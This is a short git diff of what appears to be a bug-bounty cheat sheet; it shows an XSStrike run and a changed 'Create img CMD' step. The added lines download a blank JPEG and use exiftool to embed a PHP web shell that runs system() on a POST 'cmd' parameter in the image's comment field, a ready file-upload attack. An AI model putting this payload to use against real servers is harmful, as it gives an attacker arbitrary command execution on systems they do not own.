@@ -42,4 +42,5 @@ wget 'https://raw.githubusercontent.com/SnowGlobeio/Bugbounty/main/rapide.txt' -
 python3 XSStrike-master/xsstrike.py
 
 ## Create img CMD
-exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
+wget 'https://github.com/SnowGlobeio/Bugbounty/raw/main/empty.jpg'
+exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" empty.jpg
